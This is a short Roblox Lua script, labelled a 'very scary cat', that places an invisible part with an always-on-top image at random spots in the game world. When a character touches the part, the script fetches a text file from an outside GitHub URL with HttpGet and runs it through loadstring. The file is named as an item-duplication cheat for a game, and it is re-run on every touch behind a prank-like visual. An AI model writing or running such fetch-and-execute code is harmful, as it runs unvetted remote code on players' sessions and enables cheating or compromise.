-- yes very scary cat

local x = nil

local function c()
    if x then
        x:Destroy()
    end

    x = Instance.new("Part")
    x.Size = Vector3.new(10, 10, 0.1)
    x.Position = Vector3.new(
        152.889038 + math.cos(math.random() * math.pi * 2) * math.random() * 150,
        440.754395 + 3,
        26.8562851 + math.sin(math.random() * math.pi * 2) * math.random() * 150
    )
    x.Anchored = true
    x.CanCollide = false
    x.Transparency = 1

    local g = Instance.new("BillboardGui")
    g.Size = UDim2.new(10, 0, 10, 0)
    g.AlwaysOnTop = true
    g.Parent = x

    local l = Instance.new("ImageLabel")
    l.Size = UDim2.new(1, 0, 1, 0)
    l.BackgroundTransparency = 1
    l.Image = "rbxassetid://102608555927384"
    l.Parent = g

    x.Touched:Connect(function(h)
        if h.Parent:FindFirstChild("Humanoid") then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ArchIsDead/Arch-Vault/refs/heads/main/GrowAGarden_dupe_op.txt"))()
            c()
        end
    end)

    x.Parent = game:GetService("Workspace")
end

c()
